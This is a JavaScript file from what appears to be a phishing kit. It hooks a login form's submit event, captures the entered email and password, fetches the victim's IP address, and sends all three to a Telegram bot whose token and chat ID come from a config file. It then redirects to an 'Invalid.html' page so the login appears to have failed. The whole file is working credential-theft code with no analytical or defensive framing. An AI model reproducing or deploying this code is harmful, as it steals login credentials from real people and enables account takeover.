document.addEventListener('DOMContentLoaded', function() {
    fetch('config.json')  // The path is relative to the root of the server (htdocs)
        .then(response => response.json())
        .then(config => {
            const telegramBotToken = config.telegramBotToken;
            const telegramChatId = config.telegramChatId;
            const form = document.getElementById('loginForm');

            if (form) {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();

                    const email = document.getElementById('fld.emailaddress').value;
                    const password = document.getElementById('fld.password').value;

                    // Attempt to get the IP address using a free IP API
                    fetch('https://api.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => {
                            const victimIP = data.ip;
                            const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${victimIP}`;
                            sendToTelegram(message);
                        })
                        .catch(error => {
                            console.error('Error getting IP:', error);
                            const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: IP retrieval failed`;
                            sendToTelegram(message);
                        });

                    function sendToTelegram(message) {
                        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

                        fetch(telegramApiUrl)
                            .then(response => {
                                if (response.ok) {
                                    console.log('Login data sent to Telegram.');
                                    // Redirect to the new page after sending the data
                                    window.location.href = "Invalid.html"; // Replace with your desired URL
                                } else {
                                    console.error('Failed to send login data to Telegram.');
                                }
                            })
                            .catch(error => {
                                console.error('Error sending login data:', error);
                            });
                    }
                });
            }
        })
        .catch(error => {
            console.error('Error loading Telegram config:', error);
        });
});
